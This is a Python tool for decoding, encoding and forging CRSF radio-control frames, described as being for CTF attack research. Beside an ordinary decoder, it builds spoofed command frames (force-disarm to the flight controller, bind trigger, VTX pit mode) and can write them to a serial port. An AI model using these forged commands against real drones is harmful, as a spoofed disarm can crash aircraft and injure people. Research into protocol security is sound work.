#!/usr/bin/env python3
"""CRSF packet decoder, encoder, and forger for CTF attack research.

Handles the serial CRSF protocol used between radio handsets, TX modules,
RX modules, and flight controllers. Supports:
  - Decoding raw CRSF frames from hex or binary
  - Encoding RC channel frames (type 0x16)
  - Forging command frames (type 0x32) including force-disarm
  - Reading and decoding CRSF from a serial port
  - CRC validation and generation (poly 0xD5 frame, poly 0xBA command)

Usage:
  Decode hex:     python3 crsf-packet-tool.py decode C8 18 16 ...
  Decode file:    python3 crsf-packet-tool.py decode --file capture.bin
  Encode RC:      python3 crsf-packet-tool.py encode-rc --channels 1500,1500,1000,1500
  Forge disarm:   python3 crsf-packet-tool.py forge-disarm
  Forge bind:     python3 crsf-packet-tool.py forge-bind
  Serial sniff:   python3 crsf-packet-tool.py serial --port /dev/ttyUSB0

Requires: Python 3.10+ (stdlib only, no dependencies for core features)
          pyserial for --port mode (pip install pyserial)

All transmit/inject operations require --arm flag. Default is read-only.
"""

import argparse
import struct
import sys
import time
from typing import Optional

# ---------------------------------------------------------------------------
# CRC tables
# ---------------------------------------------------------------------------

def _build_crc8_table(poly: int) -> list[int]:
    table = []
    for i in range(256):
        crc = i
        for _ in range(8):
            crc = ((crc << 1) ^ poly) & 0xFF if crc & 0x80 else (crc << 1) & 0xFF
        table.append(crc)
    return table

CRC8_D5 = _build_crc8_table(0xD5)  # Frame CRC
CRC8_BA = _build_crc8_table(0xBA)  # Command CRC


def crc8(data: bytes, table: list[int], init: int = 0) -> int:
    crc = init
    for b in data:
        crc = table[crc ^ b]
    return crc


def crc8_frame(data: bytes) -> int:
    """CRC-8 with poly 0xD5 for CRSF frame validation."""
    return crc8(data, CRC8_D5)


def crc8_command(data: bytes) -> int:
    """CRC-8 with poly 0xBA for CRSF command sub-protocol."""
    return crc8(data, CRC8_BA)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

SYNC_BYTE = 0xC8

ADDRESSES = {
    0x00: "Broadcast",
    0x0E: "Cloud",
    0x10: "USB",
    0x12: "BT/WiFi",
    0x13: "WiFi RX (game)",
    0x14: "Video RX",
    0x80: "OSD/Core PNP Pro",
    0xC0: "Current sensor",
    0xC2: "GPS",
    0xC4: "TBS Blackbox",
    0xC8: "Flight Controller",
    0xCC: "Race Tag",
    0xCE: "VTX",
    0xEA: "Radio TX",
    0xEB: "Repeater RX",
    0xEC: "CRSF Receiver",
    0xED: "Repeater TX",
    0xEE: "CRSF Transmitter",
}

FRAME_TYPES = {
    0x02: "GPS",
    0x03: "GPS Time",
    0x06: "GPS Extended",
    0x07: "Variometer",
    0x08: "Battery Sensor",
    0x09: "Baro Altitude",
    0x0A: "Airspeed",
    0x0B: "Heartbeat",
    0x0C: "RPM",
    0x0D: "Temperature",
    0x0E: "Voltages",
    0x10: "VTX Telemetry",
    0x11: "Barometer",
    0x12: "Magnetometer",
    0x13: "Accel/Gyro",
    0x14: "Link Statistics",
    0x15: "Link Stats (repeater)",
    0x16: "RC Channels Packed",
    0x17: "Subset RC Channels",
    0x1C: "Link Statistics RX",
    0x1D: "Link Statistics TX",
    0x1E: "Attitude",
    0x1F: "MAVLink FC",
    0x21: "Flight Mode",
    0x28: "Device Ping",
    0x29: "Device Info",
    0x2B: "Parameter Entry",
    0x2C: "Parameter Read",
    0x2D: "Parameter Write",
    0x32: "Command",
    0x7A: "MSP Request",
    0x7B: "MSP Response",
    0x7C: "MSP Write",
    0x7D: "Displayport Cmd",
    0x80: "ArduPilot",
    0xAA: "MAVLink Envelope",
}

COMMAND_IDS = {
    0x01: "FC",
    0x03: "Bluetooth",
    0x05: "OSD",
    0x08: "VTX",
    0x09: "LED",
    0x0A: "General",
    0x10: "Crossfire",
    0x13: "RC over WiFi",
    0x20: "Flow Control",
    0x22: "Screen",
    0xFF: "ACK",
}


# ---------------------------------------------------------------------------
# Channel encoding / decoding
# ---------------------------------------------------------------------------

def decode_channels(payload: bytes) -> list[int]:
    """Decode 16 × 11-bit RC channels from 22 bytes (type 0x16 payload)."""
    if len(payload) < 22:
        return []
    bits = int.from_bytes(payload[:22], "little")
    channels = []
    for i in range(16):
        raw = (bits >> (i * 11)) & 0x7FF
        channels.append(raw)
    return channels


def encode_channels(channels_us: list[float]) -> bytes:
    """Encode up to 16 channel values (in µs) into 22 bytes.

    Channels beyond the list are set to center (1500 µs).
    """
    raw_vals = []
    for i in range(16):
        if i < len(channels_us):
            us = channels_us[i]
        else:
            us = 1500.0
        raw = int((us - 1500.0) * 8.0 / 5.0 + 992.0)
        raw = max(0, min(0x7FF, raw))
        raw_vals.append(raw)
    bits = 0
    for i, r in enumerate(raw_vals):
        bits |= r << (i * 11)
    return bits.to_bytes(22, "little")


def raw_to_us(raw: int) -> float:
    return (raw - 992) * 5.0 / 8.0 + 1500.0


# ---------------------------------------------------------------------------
# Frame parsing
# ---------------------------------------------------------------------------

class CRSFFrame:
    """Parsed CRSF frame."""

    def __init__(self, sync: int, length: int, frame_type: int,
                 payload: bytes, crc: int, raw: bytes):
        self.sync = sync
        self.length = length
        self.frame_type = frame_type
        self.payload = payload
        self.crc = crc
        self.raw = raw
        self.crc_valid = crc == crc8_frame(bytes([frame_type]) + payload)
        self.is_extended = frame_type >= 0x28

    @property
    def type_name(self) -> str:
        return FRAME_TYPES.get(self.frame_type, f"Unknown(0x{self.frame_type:02X})")

    @property
    def dest(self) -> Optional[int]:
        if self.is_extended and len(self.payload) >= 2:
            return self.payload[0]
        return None

    @property
    def origin(self) -> Optional[int]:
        if self.is_extended and len(self.payload) >= 2:
            return self.payload[1]
        return None

    @property
    def inner_payload(self) -> bytes:
        if self.is_extended and len(self.payload) >= 2:
            return self.payload[2:]
        return self.payload

    def __repr__(self) -> str:
        parts = [f"[{self.type_name}]"]
        if self.is_extended:
            d = ADDRESSES.get(self.dest, f"0x{self.dest:02X}") if self.dest is not None else "?"
            o = ADDRESSES.get(self.origin, f"0x{self.origin:02X}") if self.origin is not None else "?"
            parts.append(f"{o} → {d}")
        parts.append(f"len={self.length}")
        parts.append(f"CRC={'OK' if self.crc_valid else 'FAIL'}")
        return " ".join(parts)

    def detail(self) -> str:
        """Human-readable detail for known frame types."""
        lines = [repr(self)]
        lines.append(f"  Raw: {self.raw.hex(' ')}")

        if self.frame_type == 0x16:
            channels = decode_channels(self.payload)
            if channels:
                lines.append("  Channels (raw → µs):")
                labels = ["Roll", "Pitch", "Throttle", "Yaw"] + [f"AUX{i}" for i in range(1, 13)]
                for i, raw in enumerate(channels):
                    us = raw_to_us(raw)
                    label = labels[i] if i < len(labels) else f"CH{i}"
                    lines.append(f"    {label:>10}: {raw:4d} → {us:7.1f} µs")

        elif self.frame_type == 0x14 and len(self.payload) >= 10:
            p = self.payload
            lines.append(f"  Uplink RSSI ant1: -{p[0]} dBm")
            lines.append(f"  Uplink RSSI ant2: -{p[1]} dBm")
            lines.append(f"  Uplink LQ: {p[2]}%")
            lines.append(f"  Uplink SNR: {int.from_bytes([p[3]], 'big', signed=True)} dB")
            lines.append(f"  Active antenna: {p[4]}")
            lines.append(f"  RF mode: {p[5]}")
            lines.append(f"  Uplink TX power: {p[6]}")
            lines.append(f"  Downlink RSSI: -{p[7]} dBm")
            lines.append(f"  Downlink LQ: {p[8]}%")
            lines.append(f"  Downlink SNR: {int.from_bytes([p[9]], 'big', signed=True)} dB")

        elif self.frame_type == 0x08 and len(self.payload) >= 8:
            p = self.payload
            voltage = int.from_bytes(p[0:2], "big") / 10.0
            current = int.from_bytes(p[2:4], "big") / 10.0
            capacity = (p[4] << 16 | p[5] << 8 | p[6])
            remaining = p[7]
            lines.append(f"  Voltage: {voltage:.1f} V")
            lines.append(f"  Current: {current:.1f} A")
            lines.append(f"  Capacity used: {capacity} mAh")
            lines.append(f"  Remaining: {remaining}%")

        elif self.frame_type == 0x02 and len(self.payload) >= 15:
            p = self.payload
            lat = struct.unpack(">i", p[0:4])[0] / 1e7
            lon = struct.unpack(">i", p[4:8])[0] / 1e7
            speed = int.from_bytes(p[8:10], "big") / 100.0
            heading = int.from_bytes(p[10:12], "big") / 100.0
            alt = int.from_bytes(p[12:14], "big") - 1000
            sats = p[14]
            lines.append(f"  Lat: {lat:.7f}°")
            lines.append(f"  Lon: {lon:.7f}°")
            lines.append(f"  Speed: {speed:.1f} m/s")
            lines.append(f"  Heading: {heading:.1f}°")
            lines.append(f"  Altitude: {alt} m")
            lines.append(f"  Satellites: {sats}")

        elif self.frame_type == 0x1E and len(self.payload) >= 6:
            p = self.payload
            pitch = struct.unpack(">h", p[0:2])[0] / 10000.0 * 57.2958
            roll = struct.unpack(">h", p[2:4])[0] / 10000.0 * 57.2958
            yaw = struct.unpack(">h", p[4:6])[0] / 10000.0 * 57.2958
            lines.append(f"  Pitch: {pitch:.1f}°")
            lines.append(f"  Roll: {roll:.1f}°")
            lines.append(f"  Yaw: {yaw:.1f}°")

        elif self.frame_type == 0x21:
            try:
                mode = self.payload.split(b"\x00")[0].decode("ascii")
                lines.append(f"  Mode: {mode}")
            except (UnicodeDecodeError, IndexError):
                pass

        elif self.frame_type == 0x32:
            ip = self.inner_payload
            if len(ip) >= 1:
                cmd_id = ip[0]
                cmd_name = COMMAND_IDS.get(cmd_id, f"0x{cmd_id:02X}")
                lines.append(f"  Command: {cmd_name} (0x{cmd_id:02X})")
                if len(ip) >= 2:
                    lines.append(f"  Sub-payload: {ip[1:].hex(' ')}")
                    cmd_data = bytes([self.frame_type]) + self.payload[:2] + ip[:-1]
                    expected_cmd_crc = crc8_command(cmd_data)
                    actual_cmd_crc = ip[-1]
                    lines.append(f"  Command CRC: 0x{actual_cmd_crc:02X} "
                                 f"({'OK' if actual_cmd_crc == expected_cmd_crc else 'FAIL'})")

        elif self.frame_type == 0x29:
            ip = self.inner_payload
            try:
                name_end = ip.index(0)
                name = ip[:name_end].decode("ascii")
                lines.append(f"  Device: {name}")
                rest = ip[name_end + 1:]
                if len(rest) >= 12:
                    serial = rest[0:4].hex()
                    hw_id = struct.unpack(">I", rest[4:8])[0]
                    fw_id = struct.unpack(">I", rest[8:12])[0]
                    lines.append(f"  Serial: {serial}")
                    lines.append(f"  HW ID: 0x{hw_id:08X}")
                    lines.append(f"  FW ID: 0x{fw_id:08X}")
            except (ValueError, UnicodeDecodeError):
                pass

        return "\n".join(lines)


def parse_frame(data: bytes, offset: int = 0) -> tuple[Optional[CRSFFrame], int]:
    """Parse one CRSF frame from data at offset. Returns (frame, next_offset)."""
    if offset + 2 > len(data):
        return None, offset

    sync = data[offset]
    length = data[offset + 1]

    if length < 2 or length > 62:
        return None, offset + 1

    frame_end = offset + 2 + length
    if frame_end > len(data):
        return None, offset

    frame_type = data[offset + 2]
    payload = data[offset + 3:frame_end - 1]
    frame_crc = data[frame_end - 1]
    raw = data[offset:frame_end]

    frame = CRSFFrame(sync, length, frame_type, payload, frame_crc, raw)
    return frame, frame_end


def parse_all(data: bytes) -> list[CRSFFrame]:
    """Parse all CRSF frames from a byte buffer."""
    frames = []
    offset = 0
    while offset < len(data):
        frame, next_offset = parse_frame(data, offset)
        if frame:
            frames.append(frame)
            offset = next_offset
        else:
            offset += 1
    return frames


# ---------------------------------------------------------------------------
# Frame construction
# ---------------------------------------------------------------------------

def build_frame(frame_type: int, payload: bytes, sync: int = SYNC_BYTE) -> bytes:
    """Build a complete CRSF frame with CRC."""
    length = len(payload) + 2  # type + CRC
    crc = crc8_frame(bytes([frame_type]) + payload)
    return bytes([sync, length, frame_type]) + payload + bytes([crc])


def build_rc_channels(channels_us: list[float]) -> bytes:
    """Build a complete RC channels frame (type 0x16)."""
    payload = encode_channels(channels_us)
    return build_frame(0x16, payload)


def build_command(dest: int, origin: int, cmd_id: int,
                  sub_payload: bytes) -> bytes:
    """Build a command frame (type 0x32) with both CRCs."""
    cmd_data_for_crc = bytes([0x32, dest, origin, cmd_id]) + sub_payload
    cmd_crc = crc8_command(cmd_data_for_crc)
    payload = bytes([dest, origin, cmd_id]) + sub_payload + bytes([cmd_crc])
    return build_frame(0x32, payload)


def build_disarm_command() -> bytes:
    """Build a force-disarm command frame.

    Sends FC command (0x01) to the flight controller (0xC8),
    pretending to be the TX module (0xEE).
    """
    return build_command(
        dest=0xC8,       # Flight Controller
        origin=0xEE,     # CRSF Transmitter
        cmd_id=0x01,     # FC command group
        sub_payload=b"\x00",  # Disarm sub-command
    )


def build_bind_command() -> bytes:
    """Build a bind trigger command.

    Sends Crossfire command (0x10) sub-command bind (0x01)
    to the CRSF Receiver (0xEC).
    """
    return build_command(
        dest=0xEC,       # CRSF Receiver
        origin=0xEE,     # CRSF Transmitter
        cmd_id=0x10,     # Crossfire command group
        sub_payload=b"\x01",  # Bind
    )


def build_vtx_pitmode(dest: int = 0xCE) -> bytes:
    """Build a VTX pit-mode enable command."""
    return build_command(
        dest=dest,
        origin=0xEE,
        cmd_id=0x08,     # VTX command group
        sub_payload=b"\x04\x01",  # Pit mode enable (hypothetical sub-cmd)
    )


def build_device_ping() -> bytes:
    """Build a device ping frame (type 0x28) to discover CRSF devices."""
    payload = bytes([0x00, 0xEA])  # dest=broadcast, origin=radio
    return build_frame(0x28, payload)


# ---------------------------------------------------------------------------
# Serial port mode
# ---------------------------------------------------------------------------

def serial_sniff(port: str, baud: int = 420000, duration: float = 0) -> None:
    """Sniff CRSF frames from a serial port."""
    try:
        import serial
    except ImportError:
        print("ERROR: pyserial not installed. Run: pip install pyserial",
              file=sys.stderr)
        sys.exit(1)

    print(f"Opening {port} at {baud} baud...", file=sys.stderr)
    ser = serial.Serial(port, baud, timeout=0.1)
    buf = b""
    count = 0
    start = time.monotonic()

    try:
        while True:
            chunk = ser.read(64)
            if chunk:
                buf += chunk
                while len(buf) >= 4:
                    frame, next_off = parse_frame(buf, 0)
                    if frame:
                        count += 1
                        elapsed = time.monotonic() - start
                        print(f"[{elapsed:8.3f}s] #{count:5d} {frame.detail()}")
                        buf = buf[next_off:]
                    else:
                        buf = buf[1:]
            if duration > 0 and (time.monotonic() - start) >= duration:
                break
    except KeyboardInterrupt:
        pass
    finally:
        ser.close()
        elapsed = time.monotonic() - start
        print(f"\n{count} frames in {elapsed:.1f}s "
              f"({count/elapsed:.1f} frames/sec)", file=sys.stderr)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def cmd_decode(args: argparse.Namespace) -> None:
    if args.file:
        with open(args.file, "rb") as f:
            data = f.read()
    elif args.hex_bytes:
        hex_str = "".join(args.hex_bytes).replace(" ", "").replace(",", "")
        data = bytes.fromhex(hex_str)
    else:
        print("ERROR: Provide hex bytes or --file", file=sys.stderr)
        sys.exit(1)

    frames = parse_all(data)
    if not frames:
        print("No valid CRSF frames found.", file=sys.stderr)
        sys.exit(1)

    for frame in frames:
        print(frame.detail())
        print()


def cmd_encode_rc(args: argparse.Namespace) -> None:
    channels = [float(x) for x in args.channels.split(",")]
    frame = build_rc_channels(channels)
    if args.hex:
        print(frame.hex(" "))
    else:
        sys.stdout.buffer.write(frame)


def cmd_forge_disarm(args: argparse.Namespace) -> None:
    if not args.arm:
        print("WARNING: This generates a force-disarm command frame.",
              file=sys.stderr)
        print("         Use --arm to enable output.", file=sys.stderr)
        print("         DRY RUN — showing hex only:", file=sys.stderr)

    frame = build_disarm_command()
    print(f"Frame: {frame.hex(' ')}", file=sys.stderr)
    parsed = parse_all(frame)
    for p in parsed:
        print(p.detail(), file=sys.stderr)

    if args.arm and args.port:
        try:
            import serial
        except ImportError:
            print("ERROR: pyserial required for --port", file=sys.stderr)
            sys.exit(1)
        baud = args.baud or 420000
        ser = serial.Serial(args.port, baud, timeout=0.5)
        ser.write(frame)
        ser.flush()
        print(f"Sent {len(frame)} bytes to {args.port}", file=sys.stderr)
        ser.close()


def cmd_forge_bind(args: argparse.Namespace) -> None:
    if not args.arm:
        print("WARNING: This generates a bind trigger command.",
              file=sys.stderr)
        print("         Use --arm to enable transmission.",
              file=sys.stderr)
        print("         DRY RUN — showing hex only:", file=sys.stderr)

    frame = build_bind_command()
    print(f"Frame: {frame.hex(' ')}", file=sys.stderr)
    parsed = parse_all(frame)
    for p in parsed:
        print(p.detail(), file=sys.stderr)

    if args.arm and args.port:
        try:
            import serial
        except ImportError:
            print("ERROR: pyserial required for --port", file=sys.stderr)
            sys.exit(1)
        baud = args.baud or 420000
        ser = serial.Serial(args.port, baud, timeout=0.5)
        ser.write(frame)
        ser.flush()
        print(f"Sent {len(frame)} bytes to {args.port}", file=sys.stderr)
        ser.close()


def cmd_serial(args: argparse.Namespace) -> None:
    serial_sniff(args.port, args.baud or 420000, args.duration)


def cmd_ping(args: argparse.Namespace) -> None:
    frame = build_device_ping()
    print(f"Frame: {frame.hex(' ')}", file=sys.stderr)
    parsed = parse_all(frame)
    for p in parsed:
        print(p.detail(), file=sys.stderr)

    if args.port:
        try:
            import serial
        except ImportError:
            print("ERROR: pyserial required for --port", file=sys.stderr)
            sys.exit(1)
        baud = args.baud or 420000
        ser = serial.Serial(args.port, baud, timeout=1.0)
        ser.write(frame)
        ser.flush()
        print(f"Sent ping, listening for responses...", file=sys.stderr)
        buf = b""
        start = time.monotonic()
        while time.monotonic() - start < 2.0:
            chunk = ser.read(64)
            if chunk:
                buf += chunk
                while len(buf) >= 4:
                    resp, off = parse_frame(buf, 0)
                    if resp:
                        if resp.frame_type == 0x29:
                            print(f"\n{resp.detail()}")
                        buf = buf[off:]
                    else:
                        buf = buf[1:]
        ser.close()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="CRSF packet decoder, encoder, and forger for CTF research",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    sub = parser.add_subparsers(dest="command", required=True)

    # decode
    p_decode = sub.add_parser("decode", help="Decode CRSF frames from hex or file")
    p_decode.add_argument("hex_bytes", nargs="*", help="Hex bytes (e.g., C8 18 16 ...)")
    p_decode.add_argument("--file", "-f", help="Read from binary file")
    p_decode.set_defaults(func=cmd_decode)

    # encode-rc
    p_enc = sub.add_parser("encode-rc", help="Encode RC channel frame")
    p_enc.add_argument("--channels", "-c", required=True,
                       help="Comma-separated µs values (e.g., 1500,1500,1000,1500)")
    p_enc.add_argument("--hex", action="store_true",
                       help="Output as hex string instead of raw bytes")
    p_enc.set_defaults(func=cmd_encode_rc)

    # forge-disarm
    p_dis = sub.add_parser("forge-disarm", help="Generate force-disarm command frame")
    p_dis.add_argument("--arm", action="store_true",
                       help="Enable actual transmission (required for --port)")
    p_dis.add_argument("--port", help="Serial port to send to")
    p_dis.add_argument("--baud", type=int, help="Baud rate (default: 420000)")
    p_dis.set_defaults(func=cmd_forge_disarm)

    # forge-bind
    p_bind = sub.add_parser("forge-bind", help="Generate bind trigger command frame")
    p_bind.add_argument("--arm", action="store_true",
                        help="Enable actual transmission (required for --port)")
    p_bind.add_argument("--port", help="Serial port to send to")
    p_bind.add_argument("--baud", type=int, help="Baud rate (default: 420000)")
    p_bind.set_defaults(func=cmd_forge_bind)

    # serial
    p_ser = sub.add_parser("serial", help="Sniff CRSF frames from serial port")
    p_ser.add_argument("--port", "-p", required=True, help="Serial port")
    p_ser.add_argument("--baud", "-b", type=int, help="Baud rate (default: 420000)")
    p_ser.add_argument("--duration", "-d", type=float, default=0,
                       help="Capture duration in seconds (0 = until Ctrl-C)")
    p_ser.set_defaults(func=cmd_serial)

    # ping
    p_ping = sub.add_parser("ping", help="Send device ping and list responses")
    p_ping.add_argument("--port", "-p", help="Serial port")
    p_ping.add_argument("--baud", "-b", type=int, help="Baud rate (default: 420000)")
    p_ping.set_defaults(func=cmd_ping)

    args = parser.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
